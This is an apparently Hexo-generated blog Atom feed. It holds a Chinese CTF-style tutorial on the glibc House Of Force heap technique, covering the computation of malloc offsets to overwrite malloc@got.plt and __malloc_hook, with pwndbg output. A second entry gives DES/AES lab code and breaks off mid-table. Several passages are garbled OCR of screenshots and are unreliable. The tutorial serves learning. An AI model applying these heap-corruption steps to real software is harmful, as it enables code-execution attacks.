<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ky不是枕木</title>
  
  <subtitle>分享学习经验</subtitle>
  <link href="https://kylinxin.github.io/atom.xml" rel="self"/>
  
  <link href="https://kylinxin.github.io/"/>
  <updated>2023-09-11T14:55:12.712Z</updated>
  <id>https://kylinxin.github.io/</id>
  
  <author>
    <name>枕木</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://kylinxin.github.io/2023/09/11/House-Of-Force/"/>
    <id>https://kylinxin.github.io/2023/09/11/House-Of-Force/</id>
    <published>2023-09-11T14:53:45.390Z</published>
    <updated>2023-09-11T14:55:12.712Z</updated>
    
    <content type="html"><![CDATA[<h1>PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）</h1><p>参考资料：<br>CTF-wiki：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a><br>附件下载：<br>链接: <a href="https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA">https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA</a>  密码: np57<br>–来自百度网盘超级会员V3的分享</p><p>House Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。在讲解原理之前，首先来看一个示例。</p><p>Linux环境</p><p>ldd</p><p>-version</p><p>Ldd(UBuntuGLIBC2.23-Oubuntu11.2)2.23</p><p>copyright()2016FreeSoftwareFoundation,I</p><p>ThereisNo</p><p>Thisisfree</p><p>eforcopyingconditions</p><p>software;seethesourcefor</p><p>ULARPURPOSE</p><p>ARRANtYteVFrMERCHANTABILITYORFITNESSFORAPARTICULARPU</p><p>WrittenbyRolandMccrathandULrichrepper</p><p>lsbrelease-a</p><p>NoLSBmodulesareavailable.</p><p>DistributorID:Ubuntu</p><p>Description:</p><p>Ubuntu16,04.7LTS</p><p>Release:</p><p>16.04</p><p>codename:</p><p>xenial</p><p class='item-img' data-src='https://cdn.nlark.com/yuque/0/2020/png/574026/1604996548718-98d3fe7f-6b0a-4943-8e8c-fba3696e8929.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_39%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10'><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604996548718-98d3fe7f-6b0a-4943-8e8c-fba3696e8929.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_39%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10" alt="截屏2020-11-10 16.22.22.png"></p><p>/main_arena/lib/x86_64-linux-gnu/libe.so6</p><p>tgit:(master)</p><p>main_arenaoffsetg</p><p>jLibcve</p><p>version:glibe2.23</p><p>dD:BuiLdD[sh1C4FD86ECLEED579C79CE601F6C63796F574DF</p><p>JbuitdID</p><p>Jmain_arena_offset:ox3c4b20</p><p>main-_arena_offsetgit:(master)Xi</p><p class='item-img' data-src='https://cdn.nlark.com/yuque/0/2020/png/574026/1604996640357-17fb2a11-4916-43a4-8d41-d791cbc58a7f.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_41%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10'><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604996640357-17fb2a11-4916-43a4-8d41-d791cbc58a7f.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_41%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10" alt="截屏2020-11-10 16.23.52.png"></p><p>Ubuntu版本为16.04，libc版本为2.23。</p><p>Demo1</p><p>pwndbg</p><p>编译命令：gcc -g -z execstack -fno-stack-protector top_chunk_demo.c -o top_chunk_demo</p><p>编译完成之后检查一下文件的保护：</p><p>pchecksec–file-top_chunk_demo</p><p>Desktop</p><p>[*]"/home/ubuntu/Desktop/top_chunk_demo</p><p>ayd64-64-Little</p><p>Arch:</p><p>RELRO:</p><p>PartialRELRO</p><p>NOCanaryFOund</p><p>staCk:</p><p>NXdisabled</p><p>NX:</p><p>(0x400000)</p><p>PIE</p><p>PIE:</p><p>No</p><p>RWX</p><p>RWX:</p><p>Has</p><p>segmentS</p><p>Desktop</p><p class='item-img' data-src='https://cdn.nlark.com/yuque/0/2020/png/574026/1604996739742-105e6fb0-694e-4744-8694-fd99c5885550.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_21%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10'><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604996739742-105e6fb0-694e-4744-8694-fd99c5885550.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_21%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10" alt="截屏2020-11-10 16.25.34.png"></p><p>编译好之后，对其进行gdb调试。对代码的第5行下断点：</p><p>看一下heap的状况：</p><p>这里记下此时top_chunk的大小为0x20fe1。执行同样的步骤，让程序执行malloc(0x20);这时的heap情况如下：</p><p>从上面的代码框可以看到，系统新开辟了一个大小为0x31的内存空间。此时的top_chunk_size减少了0x30大小。</p><p>继续调试，让程序执行malloc(0x30);，再来看一下heap：</p><p>此时的top_chunk减小了0x40。</p><p>结论</p><p>从上面可以看出，在分配比top_chunk小的chunk时，会从top_chunk中分割出要分配的chunk，并且top_chunk向下移动。</p><p>攻击原理</p><p>好了，看过了Demo1现在讲解House Of Force原理就应该没有问题了。</p><p>如果一个堆漏洞要想通过House Of Force进行利用，那么必须满足以下条件：</p><p>●能够以溢出等方式控制到top_chunk的size域</p><p>●能够自由的控制堆分配尺寸的大小</p><p>House Of Force产生的原因在于glibc对top_chunk的处理：根据分配堆块的原理我们得知，进行堆分配时，如果所有空闲的块（bin）都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>假如说 top_chunk_size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p><p>然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证：</p><p>根据上面的源码知道，假如说top_chunk_size被篡改成很大的值，就可以很轻松的通过这个验证，这也就是前面我们所说的需要一个能够控制top_chunk_size的漏洞。若要绕过这个验证，一般的做法是将top_chunk_size改为-1，因为在进行比较的时候会将size转换为无符号数。进一步来说就是将-1转换为unsigned long中最大的数，所以无论如何可以通过验证。验证通过之后，会将top_chunk指针进行更新，接下来的堆块就会分配到这个位置。用户只要控制了这个指针就相当于控制了任意地址。与此同时，top_chunk的size也会更新。</p><p>总结一下：如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p><p>向前控制内存-Demo2</p><p>在学习完原理之后，我们通过一个简单的示例来进一步说明House Of Force的利用。</p><p>这个例子的目标是通过HOF（House Of Force）来篡改malloc@got.plt 实现劫持程序流程。<br>Demo2和之后的Demo3都会出现在我的电脑上gdb调试不出错，但是直接运行程序就会崩溃的情况，暂不清楚导致这种情况的原因。</p><p>示例的源代码如下：</p><p>gcc -g -z execstack -fno-stack-protector top_chunk_demo1.c -o top_chunk_demo1</p><p>和上面的调试步骤相同，对代码的第6行下断点，然后运行程序，查看堆的情况：</p><p>对程序第7行下断点，让程序运行ptr=(long *)(((long)ptr)+24);</p><p>相同的步骤，让程序继续执行*ptr=-1;：</p><p>从上面的代码框中可以看出top_chunk_size已经被改成了0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。</p><p>还记得我们的目标吗？通过HOF（House Of Force）来篡改malloc@got.plt 实现劫持程序流程。</p><p>接下来程序就开始执行malloc(-4120);了，有个疑问，-4120这个数字是怎么来的？</p><p>由于我们的目标是malloc@got.plt，因此将程序拖入IDA中：</p><p>got.p1t000000000060101wor11</p><p>xREF:sub4003F0+6t</p><p>DATA</p><p>libcstart</p><p>daoffset</p><p>gotp0000000000001</p><p>main</p><p>got.p1t:0000000000601018</p><p>1ibcstart_maint</p><p>DATAXREF:</p><p>got.p000000000060102102</p><p>dgoffset</p><p>ma11oc</p><p>DATAXREF:</p><p>malloct</p><p>got.p1t:0000000000601020</p><p>ends</p><p>gotP1+</p><p>got.p1t:0000000000601020</p><p>DAta:0000000000601028</p><p>DATA:Q000000000601028</p><p>data</p><p>PUKe</p><p>data:0000000000601028</p><p>type</p><p>Segment</p><p class='item-img' data-src='https://cdn.nlark.com/yuque/0/2020/png/574026/1605015661033-f8aba608-ba19-4040-8430-7ff57c77784e.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_51%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10'><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1605015661033-f8aba608-ba19-4040-8430-7ff57c77784e.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_51%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10" alt="截屏2020-11-10 21.40.56.png"></p><p>从IDA中可以看到malloc@got.plt所在的地址为0x601020:</p><p>所以我们应该将 top_chunk 指向0x601010处，这样当下次再分配chunk时，就可以分配到malloc@got.plt处的内存了。</p><p>根据前面描述top_chunk位于0x602020，所以我们可以计算偏移0x601010-0x602020=-4112。</p><p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数：</p><p>输入的大小后需要经过checked_request2size函数：</p><p>一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。</p><p>另一方面，在满足对应的约束后，我们需要使得 request2size正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 恰好为 - 4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其减去 SIZE_SZ和MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。</p><p>32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。<br>malloc(-4112-SIZE_SZ)=malloc(-4112-8)=malloc(-4120)。</p><p>因此，我们当调用malloc(-4120)之后，我们可以观察到 top chunk 被抬高到我们想要的位置。</p><p>对代码的第9行下断点，执行代码malloc(-4120);：</p><p>最后程序malloc(0x10);之后，就可以控制malloc@got.plt处的地址：</p><p>但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。</p><p>向后控制内存-Demo3</p><p>在上一个示例中，我们演示了篡改top_chunk使得top_chunk指针减小来修改位于其上面 (低地址) 的 got 表中的内容。同样的，利用此方式可以修改其下面（高地址）的内容。这次同样的利用代码进行演示：</p><p>编译命令：gcc -g -z execstack -fno-stack-protector top_chunk_demo2.c -o top_chunk_demo2</p><p>编译完成之后，开始对其进行调试，对代码的第6行下断点，看一下堆的情况：</p><p>对代码的第7行下断点，继续运行程序，再来看一下堆的情况：</p><p>从上面可以看到top_chunk的size域已经被修改，让程序继续执行malloc(140737345551056);</p><p>为什么是malloc这么一长串数字？</p><p>这次我们的目标是__malloc_hook，我们知道__malloc_hook 是位于 <a href="http://libc.so">libc.so</a> 里的全局变量值，首先查看内存布局:</p><p>可以看到heap的基址在0x602000，而libc的基址在0x7ffff7a0d000，因此我们需要通过HOF扩大top_chunk指针的值来实现对__malloc_hook的写。 首先，由pwndbg得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 :</p><p>采取计算0x7ffff7dd1b00-0x602020-0x10=140737345551056</p><p>经过这次 malloc 之后，我们可以观察到 top_chunk 的地址被抬高到了 0x00007ffff7dd1b00：</p><p>C</p><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>pwndbg&gt; info local</p><p>ptr = 0x602028</p><p>pwndbg&gt; heap</p><p>Allocated chunk</p><p>Addr: 0x7ffff7dd1000</p><p>Size: 0x7ffff7fdb000</p><p>pwndbg&gt; top_chunk</p><p>Top chunk</p><p>Addr: 0x7ffff7dd1b00</p><p>Size: 0x-7ffff77cfae7</p><p>pwndbg&gt; x/16gx &amp;main_arena</p><p>0x7ffff7dd1b20 &lt;main_arena&gt;:0x00000001000000000x0000000000000000</p><p>0x7ffff7dd1b30 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b40 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b50 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b60 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b70 &lt;main_arena+80&gt;:0x00000000000000000x00007ffff7dd1b00 #top_chunk</p><p>0x7ffff7dd1b80 &lt;main_arena+96&gt;:0x00000000000000000x00007ffff7dd1b78</p><p>0x7ffff7dd1b90 &lt;main_arena+112&gt;:0x00007ffff7dd1b780x00007ffff7dd1b88</p><p>pwndbg&gt; x/16gx 0x7ffff7dd1b00</p><p>0x7ffff7dd1b00 &lt;__memalign_hook&gt;:0x00007ffff7a92ea00xffff800008830519</p><p>0x7ffff7dd1b10 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b20 &lt;main_arena&gt;:0x00000001000000000x0000000000000000</p><p>0x7ffff7dd1b30 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b40 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b50 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b60 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b70 &lt;main_arena+80&gt;:0x00000000000000000x00007ffff7dd1b00 #top_chunk</p><p>pwndbg&gt;</p><p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了：</p><p>C</p><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>pwndbg&gt; heap</p><p>Allocated chunk</p><p>Addr: 0x7ffff7dd1000</p><p>Size: 0x7ffff7fdb000</p><p>pwndbg&gt; top_chunk</p><p>Top chunk</p><p>Addr: 0x7ffff7dd1b20</p><p>Size: 0x-7ffff77cfb07</p><p>pwndbg&gt; x/20gx 0x7ffff7dd1b00</p><p>0x7ffff7dd1b00 &lt;__memalign_hook&gt;:0x00007ffff7a92ea00x0000000000000021#new_chunk</p><p>0x7ffff7dd1b10 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b20 &lt;main_arena&gt;:0x00000001000000000xffff8000088304f9 #top_chunk</p><p>0x7ffff7dd1b30 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b40 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b50 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b60 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</p><p>0x7ffff7dd1b70 &lt;main_arena+80&gt;:0x00000000000000000x00007ffff7dd1b20 #指向top_chunk</p><p>0x7ffff7dd1b80 &lt;main_arena+96&gt;:0x00000000000000000x00007ffff7dd1b78</p><p>0x7ffff7dd1b90 &lt;main_arena+112&gt;:0x00007ffff7dd1b780x00007ffff7dd1b88</p><p>pwndbg&gt;</p><p>记住两个公式解题更简单，下一小节将会讲解。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;PWN入门（3-12-1）-House Of Force（控制top_chunk）（基础）&lt;/h1&gt;
&lt;p&gt;参考资料：&lt;br&gt;
CTF-wiki：&lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>密码学实验</title>
    <link href="https://kylinxin.github.io/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/"/>
    <id>https://kylinxin.github.io/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-05-05T12:10:42.242Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><pre><code class="language-C++">#include &lt;bits/stdc++.h&gt;using namespace std;string string_to_hex(const string&amp; str) //字符串转化为十六进制{    string result="";    string tmp;    stringstream ss;    for(int i=0;i&lt;str.size();i++)    {        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;        ss&gt;&gt;tmp;        result+=tmp;    }    return result;}string hex_to_string(const std::string&amp; str){    std::string result;    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符    {        std::string byte = str.substr(i, 2);//每次切两个字符        //将十六进制的string转成long再强转成int再转成char        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);        result.push_back(chr);//将处理完的字符压入result中    }    return result;}string hex2bin(string s){    //十六进制转化为二进制    unordered_map&lt;char, string&gt; mp;    mp['0'] = "0000";    mp['1'] = "0001";    mp['2'] = "0010";    mp['3'] = "0011";    mp['4'] = "0100";    mp['5'] = "0101";    mp['6'] = "0110";    mp['7'] = "0111";    mp['8'] = "1000";    mp['9'] = "1001";    mp['A'] = "1010";    mp['B'] = "1011";    mp['C'] = "1100";    mp['D'] = "1101";    mp['E'] = "1110";    mp['F'] = "1111";    string bin = "";    for (int i = 0; i &lt; s.size(); i++) {        bin += mp[s[i]];    }    return bin;}string bin2hex(string s){    // 二进制转化为16进制    unordered_map&lt;string, string&gt; mp;    mp["0000"] = "0";    mp["0001"] = "1";    mp["0010"] = "2";    mp["0011"] = "3";    mp["0100"] = "4";    mp["0101"] = "5";    mp["0110"] = "6";    mp["0111"] = "7";    mp["1000"] = "8";    mp["1001"] = "9";    mp["1010"] = "A";    mp["1011"] = "B";    mp["1100"] = "C";    mp["1101"] = "D";    mp["1110"] = "E";    mp["1111"] = "F";    string hex = "";    for (int i = 0; i &lt; s.length(); i += 4) {        string ch = "";        ch += s[i];        ch += s[i + 1];        ch += s[i + 2];        ch += s[i + 3];        hex += mp[ch];    }    return hex;}string permute(string k, int* arr, int n){    string per = "";    for (int i = 0; i &lt; n; i++) {        per += k[arr[i] - 1];    }    return per;}string shift_left(string k, int shifts){    string s = "";    for (int i = 0; i &lt; shifts; i++) {        for (int j = 1; j &lt; 28; j++) {            s += k[j];        }        s += k[0];        k = s;        s = "";    }    return k;}string xor_(string a, string b){    string ans = "";    for (int i = 0; i &lt; a.size(); i++) {        if (a[i] == b[i]) {            ans += "0";        }        else {            ans += "1";        }    }    return ans;}string encrypt(string pt, vector&lt;string&gt; rkb,               vector&lt;string&gt; rk){    // 16-&gt;2    pt = hex2bin(pt);    // 初始置换    int initial_perm[64]            = { 58, 50, 42, 34, 26, 18, 10, 2,  60, 52, 44,                36, 28, 20, 12, 4,  62, 54, 46, 38, 30, 22,                14, 6,  64, 56, 48, 40, 32, 24, 16, 8,  57,                49, 41, 33, 25, 17, 9,  1,  59, 51, 43, 35,                27, 19, 11, 3,  61, 53, 45, 37, 29, 21, 13,                5,  63, 55, 47, 39, 31, 23, 15, 7 };    // 初始置换    pt = permute(pt, initial_perm, 64);    cout &lt;&lt; "初始置换后: " &lt;&lt; bin2hex(pt)         &lt;&lt; endl;    // 拆分成左右32比特    string left = pt.substr(0, 32);    string right = pt.substr(32, 32);    cout &lt;&lt; "拆分后: L0=" &lt;&lt; bin2hex(left)         &lt;&lt; " R0=" &lt;&lt; bin2hex(right) &lt;&lt; endl;    // E盒扩展    int exp_d[48]            = { 32, 1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,                8,  9,  10, 11, 12, 13, 12, 13, 14, 15, 16, 17,                16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,                24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1 };    // S盒    int s[8][4][16] = {            { 14, 4,  13, 1, 2,  15, 11, 8,  3,  10, 6,  12, 5,9,  0,  7,  0, 15, 7,  4,  14, 2,  13, 1,  10, 6,12, 11, 9,  5, 3,  8,  4,  1,  14, 8,  13, 6,  2, 11, 15, 12, 9, 7,  3,  10, 5,  0,  15, 12, 8,  2, 4,  9,  1,  7, 5,  11, 3,  14, 10, 0,  6,  13 },            { 15, 1,  8,  14, 6,  11, 3, 4,  9,  7,  2,  13, 12, 0,  5,  10, 3,  13, 4,  7, 15, 2,  8,  14, 12, 0, 1,  10, 6,  9,  11, 5,  0, 14, 7,  11, 10, 4,  13, 1,  5,  8,  12, 6,  9,  3, 2,  15, 13, 8,  10, 1, 3,  15, 4,  2,  11, 6,  7, 12, 0,  5,  14, 9 },{ 10, 0,  9,  14, 6,  3,  15, 5,  1,  13, 12, 7,  11, 4,  2,  8,  13, 7,  0,  9,  3,  4, 6,  10, 2,  8,  5,  14, 12, 11, 15, 1,  13, 6,  4,  9,  8,  15, 3,  0,  11, 1,  2,  12, 5,  10, 14, 7,  1,  10, 13, 0,  6,  9,  8, 7,  4,  15, 14, 3,  11, 5,  2,  12 },            { 7,  13, 14, 3,  0,  6,  9,  10, 1,  2, 8,  5,  11, 12, 4,  15, 13, 8,  11, 5,  6,  15, 0, 3,  4,  7, 2,  12, 1,  10, 14, 9,  10, 6,  9,  0, 12, 11, 7, 13, 15, 1,  3,  14, 5,  2,  8,  4,  3, 15, 0,  6, 10, 1,  13, 8,  9,  4,  5,  11, 12, 7, 2,  14 },            { 2,  12, 4, 1,  7,  10, 11, 6, 8,  5,  3,  15, 13, 0,  14, 9, 14, 11, 2,  12, 4, 7,  13, 1,  5,  0, 15, 10, 3, 9,  8,  6,  4,  2, 1,  11, 10, 13, 7, 8,  15, 9, 12, 5,  6,  3,  0, 14, 11, 8,  12, 7, 1,  14, 2, 13, 6,  15, 0,  9, 10, 4,  5,  3 },            { 12, 1,  10, 15, 9,  2,  6,  8,  0,  13, 3, 4, 14, 7,  5,  11, 10, 15, 4,  2,  7,  12, 9,  5, 6, 1, 13, 14, 0,  11, 3,  8,  9,  14, 15, 5,  2, 8, 12, 3,  7,  0,  4,  10, 1,  13, 11, 6,  4,  3, 2, 12, 9,  5,  15, 10, 11, 14, 1,  7,  6,  0,  8, 13 },            { 4,  11, 2,  14, 15, 0,  8, 13, 3,  12, 9,  7,  5,  10, 6,  1,  13, 0,  11, 7, 4,  9,  1,  10, 14, 3, 5,  12, 2,  15, 8,  6,  1, 4,  11, 13, 12, 3,  7, 14, 10, 15, 6,  8,  0,  5, 9,  2,  6,  11, 13, 8, 1,  4,  10, 7,  9,  5,  0, 15, 14, 2,  3,  12 },            { 13, 2,  8, 4,  6,  15, 11, 1,  10, 9, 3, 14, 5, 0,  12, 7, 1,  15, 13, 8,  10, 3,  7, 4, 12, 5, 6,  11, 0, 14, 9,  2,  7,  11, 4,  1, 9, 12, 14, 2,  0,  6, 10, 13, 15, 3,  5,  8,  2, 1, 14, 7, 4,  10, 8, 13, 15, 12, 9,  0,  3,  5, 6, 11 }    };    // P盒置换    int per[32]            = { 16, 7, 20, 21, 29, 12, 28, 17, 1,  15, 23,                26, 5, 18, 31, 10, 2,  8,  24, 14, 32, 27,                3,  9, 19, 13, 30, 6,  22, 11, 4,  25 };    cout &lt;&lt; endl;    for (int i = 0; i &lt; 16; i++) {        string right_expanded = permute(right, exp_d, 48);        string x = xor_(rkb[i], right_expanded);        // S        string op = "";        for (int i = 0; i &lt; 8; i++) {            int row = 2 * int(x[i * 6] - '0')                      + int(x[i * 6 + 5] - '0');            int col = 8 * int(x[i * 6 + 1] - '0')                      + 4 * int(x[i * 6 + 2] - '0')                      + 2 * int(x[i * 6 + 3] - '0')                      + int(x[i * 6 + 4] - '0');            int val = s[i][row][col];            op += char(val / 8 + '0');            val = val % 8;            op += char(val / 4 + '0');            val = val % 4;            op += char(val / 2 + '0');            val = val % 2;            op += char(val + '0');        }        op = permute(op, per, 32);        x = xor_(op, left);        left = x;        // 交换左右        if (i != 15) {            swap(left, right);        }        cout &lt;&lt; "轮数: " &lt;&lt; i + 1 &lt;&lt; " " &lt;&lt; bin2hex(left)             &lt;&lt; " " &lt;&lt; bin2hex(right) &lt;&lt; " " &lt;&lt; rk[i]             &lt;&lt; endl;    }    // 左右结合    string combine = left + right;    // IP逆置换    int final_perm[64]            = { 40, 8,  48, 16, 56, 24, 64, 32, 39, 7,  47,                15, 55, 23, 63, 31, 38, 6,  46, 14, 54, 22,                62, 30, 37, 5,  45, 13, 53, 21, 61, 29, 36,                4,  44, 12, 52, 20, 60, 28, 35, 3,  43, 11,                51, 19, 59, 27, 34, 2,  42, 10, 50, 18, 58,                26, 33, 1,  41, 9,  49, 17, 57, 25 };    string cipher = bin2hex(permute(combine, final_perm, 64));    return cipher;}int main(){    string pt, key;    cout&lt;&lt;"请输入明文: ";    cin&gt;&gt;pt;    cout&lt;&lt;"请输入密文: ";    cin&gt;&gt;key;    pt = string_to_hex(pt);    cout&lt;&lt;pt;    key = string_to_hex(key);    key = hex2bin(key);    int keyp[56]            = { 57, 49, 41, 33, 25, 17, 9,  1,  58, 50, 42, 34,                26, 18, 10, 2,  59, 51, 43, 35, 27, 19, 11, 3,                60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7,                62, 54, 46, 38, 30, 22, 14, 6,  61, 53, 45, 37,                29, 21, 13, 5,  28, 20, 12, 4 };    //密钥生成    key = permute(key, keyp, 56);    int shift_table[16] = { 1, 1, 2, 2, 2, 2, 2, 2,                            1, 2, 2, 2, 2, 2, 2, 1 };    int key_comp[48] = { 14, 17, 11, 24, 1,  5,  3,  28,                         15, 6,  21, 10, 23, 19, 12, 4,                         26, 8,  16, 7,  27, 20, 13, 2,                         41, 52, 31, 37, 47, 55, 30, 40,                         51, 45, 33, 48, 44, 49, 39, 56,                         34, 53, 46, 42, 50, 36, 29, 32 };    string left = key.substr(0, 28);    string right = key.substr(28, 28);    vector&lt;string&gt; rkb;    vector&lt;string&gt; rk;    for (int i = 0; i &lt; 16; i++) {        left = shift_left(left, shift_table[i]);        right = shift_left(right, shift_table[i]);        string combine = left + right;        string RoundKey = permute(combine, key_comp, 48);        rkb.push_back(RoundKey);        rk.push_back(bin2hex(RoundKey));    }    cout &lt;&lt; "加密:\n";    string cipher = encrypt(pt, rkb, rk);    cout &lt;&lt; "密文: " &lt;&lt; cipher &lt;&lt; endl;    cout &lt;&lt; "解密:\n";    reverse(rkb.begin(), rkb.end());    reverse(rk.begin(), rk.end());    string text = encrypt(cipher, rkb, rk);    text = hex_to_string(text);    cout &lt;&lt; "明文: " &lt;&lt; text &lt;&lt; endl;}</code></pre><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><pre><code class="language-c++">#include &lt;iostream&gt;#include &lt;bits/stdc++.h&gt;#include &lt;stdint.h&gt;#include&lt;iomanip&gt;void AddRoundKey(uint8_t mtx[],uint32_t w[]);uint32_t SubKeys(uint32_t temp);void SubBytes(uint8_t mtx[],int len);void KeyExpansion(uint8_t key[], uint32_t new_key[]);void Display(uint8_t Matrix[]);void DisplayKeys(uint8_t Matrix[][16]);uint32_t left_bit_move(uint32_t val, int n);using namespace std;uint32_t T[4][256];//存储4张列混淆表int mixCol[4][4] = {        {0x02, 0x03, 0x01, 0x01},        {0x01, 0x02, 0x03, 0x01},        {0x01, 0x01, 0x02, 0x03},        {0x03, 0x01, 0x01, 0x02}};//列混淆矩阵uint8_t S_Box[16][16] =        {                {0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76},                {0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0},                {0xB7, 0xFD, 0x93, 0x26, 